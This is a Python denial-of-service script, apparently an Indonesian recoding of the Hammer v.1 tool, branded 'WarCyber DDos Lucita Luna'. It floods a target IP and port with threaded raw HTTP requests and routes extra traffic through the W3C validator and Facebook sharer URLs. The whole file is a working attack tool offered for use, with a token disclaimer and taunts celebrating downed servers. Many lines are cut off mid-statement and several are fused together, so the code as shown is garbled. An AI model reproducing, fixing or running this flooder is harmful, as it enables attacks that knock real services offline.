#!/usr/bin/python3
# -*- coding: utf-8 -*-
__        __          ____      _
\ \      / /_ _ _ __ / ___|   _| |__   ___ _ __
 \ \ /\ / / _` | '__| |  | | | | '_ \ / _ \ '__|
  \ V  V / (_| | |  | |__| |_| | |_) |  __/ |
   \_/\_/ \__,_|_|   \____\__, |_.__/ \___|_|
                          |__/
# WarCyber DDos Versi Lucita Luna :v
# Di buat untuk DDos, gunakan dengan Bijak :*
# By WATERFALL CYBER FAMILY
# Kekuatan DDos Lucita luna :'v Rasakan Amarahnya!! HaHa

from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def user_agent():
        global uagent
        uagent=[]
        uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Ope>
        uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/2>
        uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) >
        uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.>
        uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML,>
        uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9>
        uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9>
        return(uagent)def my_bots():
        global bots
        bots=[]
        bots.append("http://validator.w3.org/check?uri=")
        bots.append("http://www.facebook.com/sharer/sharer.php?u=")
        return(bots)


def bot_hammering(url):
        try:
                while True:
                        req = urllib.request.urlopen(urllib.request.Request(u>
                        print("\033[94mLucita luna mengelus target...\033[0m")
                        time.sleep(.1)
        except:
                time.sleep(.1)


def down_it(item):
        try:
                while True:
                        packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User>
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((host,int(port)))
                        if s.sendto( packet, (host, int(port)) ):s.shutdown(1)
                                print ("\033[92m",time.ctime(time.time()),"\0>
                        else:
                                s.shutdown(1)
                                print("\033[91mBerhenti<->ah\033[0m")
                        time.sleep(.1)
        except socket.error as e:
                print("\033[91mServer tumbang! Lucita luna berhasil\033[0m")
                #print("\033[91m",e,"\033[0m")
                time.sleep(.1)


def dos():
        while True:
                item = q.get()
                down_it(item)
                q.task_done()


def dos2():
        while True:
                item=w.get()
                bot_hammering(random.choice(bots)+"http://"+host)
                w.task_done()def usage():
        print (''' \033[92m
        ╦  ┬ ┬┌─┐┬┌┬┐┌─┐  ╔╦╗╔╦╗┌─┐╔═╗
        ║  │ ││  │ │ ├─┤   ║║ ║║│ │╚═╗
        ╩═╝└─┘└─┘┴ ┴ ┴ ┴  ═╩╝═╩╝└─┘╚═╝
        Pukulan Lucita Luna Dos Script WarCyber Project
        Pembuat tidak bertanggung jawab jika digunakan untuk melawan hukum.
        Pembuat tidak bertanggung jawab jika Lucita Luna hamil :).
        Script ini recode ke bahasa indonesia dari script Hammer v.1 \n
        cara pakai : python3 pukul.py [-s] [-p] [-t]
        contoh : python3 pukul.py -s 192.168.0.1 -p 80 -t 135
        -h : help
        -s : alamat ip target
        -p : port target, contoh 80
        -t : turbo default nya 135 \033[0m''')
        sys.exit()def get_parameters():
        global host
        global port
        global thr
        global item
        optp = OptionParser(add_help_option=False,epilog="Hammers")
        optp.add_option("-q","--quiet", help="set logging to ERROR",action="s>
        optp.add_option("-s","--server", dest="host",help="attack to server i>
        optp.add_option("-p","--port",type="int",dest="port",help="-p 80 defa>
        optp.add_option("-t","--turbo",type="int",dest="turbo",help="default >
        optp.add_option("-h","--help",dest="help",action='store_true',help="h>
        opts, args = optp.parse_args()
        logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(mes>
        if opts.help:
                usage()
        if opts.host is not None:
                host = opts.host
        else:
                usage()
        if opts.port is None:
                port = 80
        else:
                port = opts.port
        if opts.turbo is None:
                thr = 135
        else:
                thr = opts.turbo# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
        if len(sys.argv) < 2:
                usage()
        get_parameters()
        print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0>
        print("\033[94mLucita luna melakukan Pengecekan...\033[0m")
        user_agent()
        my_bots()
        time.sleep(5)
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host,int(port)))
                s.settimeout(1)
        except socket.error as e:
                print("\033[91mKesalahan : Cek lagi ip and port target\033[0m>
                usage()while True:
                for i in range(int(thr)):
                        t = threading.Thread(target=dos)
                        t.daemon = True  # if thread is exist, it dies
                        t.start()
                        t2 = threading.Thread(target=dos2)
                        t2.daemon = True  # if thread is exist, it dies
                        t2.start()
                start = time.time()
                #tasking
                item = 0
                while True:
                        if (item>1800): # for no memory crash
                                item=0
                                time.sleep(.1)
                        item = item + 1
                        q.put(item)
                        w.put(item)
                q.join()
                w.join()